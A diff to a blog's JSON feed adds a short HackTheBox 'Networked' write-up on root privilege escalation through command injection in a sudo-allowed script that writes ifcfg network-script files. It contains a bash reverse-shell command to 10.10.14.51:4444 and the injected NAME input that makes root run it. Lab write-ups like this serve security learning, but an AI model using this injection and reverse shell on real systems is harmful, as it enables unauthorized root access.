@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
+            "title": "Network Scripts Command Injection",
+            "summary": "Network Scripts Command Injection",
+            "content_text": "OverviewAttacker can do privesc if user has sudo permissions to create or modify ifcfg-&lt;DEVICE_NAME&gt; under /etc/sysconfig/network-scriptsEnvironment Setup and Requirements  Sudo permissionsUser guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh  Script content#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\techo \"interface $var:\"\tread x\twhile [[ ! $x =~ $regexp ]]; do\t\techo \"wrong input, try again\"\t\techo \"interface $var:\"\t\tread x\tdone\techo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone  /sbin/ifup guly0Steps  Create your malicuous scriptecho 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1' &gt; /home/guly/evil  Open netcat listener on attacker machine  Run script using sudo and enjoy[guly@networked ~]$ sudo /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil[...redacted...]References  Linux Privilege Escalation - HackTricks  HackTheBox - Networked",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can do privesc if user has sudo permissions to create or modify <code class=\"language-plaintext highlighter-rouge\">ifcfg-&lt;DEVICE_NAME&gt;</code> under <code class=\"language-plaintext highlighter-rouge\">/etc/sysconfig/network-scripts</code></p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Sudo permissions</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>User guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh</code></pre></div></div><ul>  <li>Script content</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\">#!/bin/bash -p</span><span class=\"nb\">cat</span> <span class=\"o\">&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly <span class=\"o\">&lt;&lt;</span> <span class=\"no\">EoF</span><span class=\"sh\">DEVICE=guly0ONBOOT=noNM_CONTROLLED=no</span><span class=\"no\">EoF</span><span class=\"nv\">regexp</span><span class=\"o\">=</span><span class=\"s2\">\"^[a-zA-Z0-9_</span><span class=\"se\">\\ </span><span class=\"s2\">/-]+$\"</span><span class=\"k\">for </span>var <span class=\"k\">in </span>NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO<span class=\"p\">;</span> <span class=\"k\">do\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t<span class=\"nb\">read </span>x\t<span class=\"k\">while</span> <span class=\"o\">[[</span> <span class=\"o\">!</span> <span class=\"nv\">$x</span> <span class=\"o\">=</span>~ <span class=\"nv\">$regexp</span> <span class=\"o\">]]</span><span class=\"p\">;</span> <span class=\"k\">do\t\t</span><span class=\"nb\">echo</span> <span class=\"s2\">\"wrong input, try again\"</span>\t\t<span class=\"nb\">echo</span> <span class=\"s2\">\"interface </span><span class=\"nv\">$var</span><span class=\"s2\">:\"</span>\t\t<span class=\"nb\">read </span>x\t<span class=\"k\">done\t</span><span class=\"nb\">echo</span> <span class=\"nv\">$var</span><span class=\"o\">=</span><span class=\"nv\">$x</span> <span class=\"o\">&gt;&gt;</span> /etc/sysconfig/network-scripts/ifcfg-guly<span class=\"k\">done</span>  /sbin/ifup guly0</code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Create your malicuous script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'</span> <span class=\"o\">&gt;</span> /home/guly/evil</code></pre></div></div><ul>  <li>Open netcat listener on attacker machine</li>  <li>Run script using sudo and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[</span>guly@networked ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> /usr/local/sbin/changename.shinterface NAME:guly0 /home/guly/evil<span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-sysconfig-network-scripts-centos-redhat\">Linux Privilege Escalation - HackTricks</a></li>  <li><a href=\"https://www.youtube.com/watch?v=H3t3G70bakM\">HackTheBox - Networked</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/02/22/network-scripts-command-injection",
+            
+            
+            
+            "tags": ["linux","privesc","networking"],
+            
+            "date_published": "2022-02-22T00:00:00+08:00",
+            "date_modified": "2022-02-22T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/02/19/october-cms",
             "title": "October CMS",
             "summary": "October CMS",
